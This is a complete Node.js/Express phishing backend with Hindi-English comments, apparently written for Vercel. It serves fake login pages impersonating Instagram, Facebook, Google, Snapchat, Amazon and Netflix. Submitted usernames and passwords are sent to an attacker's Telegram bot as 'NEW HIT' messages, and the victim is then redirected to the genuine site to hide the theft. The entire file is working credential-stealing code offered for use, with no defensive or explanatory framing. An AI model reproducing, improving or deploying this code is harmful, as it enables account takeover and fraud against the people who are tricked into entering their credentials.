const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');

const app = express();

// --- CONFIGURATION (Vercel ke Environment Variables se aayega) ---
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// Service aur unke real links ka map
const redirectMap = {
    'Instagram': 'https://www.instagram.com',
    'Facebook': 'https://www.facebook.com',
    'Google': 'https://www.google.com',
    'Snapchat': 'https://www.snapchat.com',
    'Amazon': 'https://www.amazon.com',
    'Netflix': 'https://www.netflix.com'
};

app.use(bodyParser.urlencoded({ extended: true }));

// --- DYNAMIC PAGE SERVER ---
// Yeh link ke hisaab se sahi page dikhayega
app.get('/', (req, res) => {
    const service = req.query.service;
    if (service && redirectMap[service]) {
        // SAHI KIYA GAYA: File ka naam sahi se joda gaya hai
        res.sendFile(path.join(__dirname, 'pages', service.toLowerCase() + '.html'));
    } else {
        res.status(404).send('Service Not Found.');
    }
});

// --- DATA CATCHER ---
// Yeh form ka data pakdega
app.post('/login-data', (req, res) => {
    const { username, password, service } = req.body;

    // SAHI KIYA GAYA: IF condition mein || (OR) operator daala gaya hai
    if (!username || !password || !service) {
        return res.status(400).send("Missing data from form.");
    }

    // SAHI KIYA GAYA: Message ko backticks (``) mein daala gaya hai
    const message = `
💎✨ **!! NEW HIT !!** ✨💎
▬▬▬▬▬▬▬▬▬▬▬▬
🎯 **Service:** *${service}*
👤 **Username:** \`${username}\`
🔑 **Password:** \`${password}\`
▬▬▬▬▬▬▬▬▬▬▬▬
    `;

    // SAHI KIYA GAYA: API URL ko backticks (``) mein daala gaya hai
    const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    axios.post(telegramApiUrl, {
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
    })
    .then(() => {
        // User ko asli site par redirect kar do
        res.redirect(redirectMap[service]);
    })
    .catch(error => {
        console.error("Telegram API Error:", error.response ? error.response.data : error.message);
        res.status(500).send("Error sending data.");
    });
});

// Vercel ke liye export karo
module.exports = app;
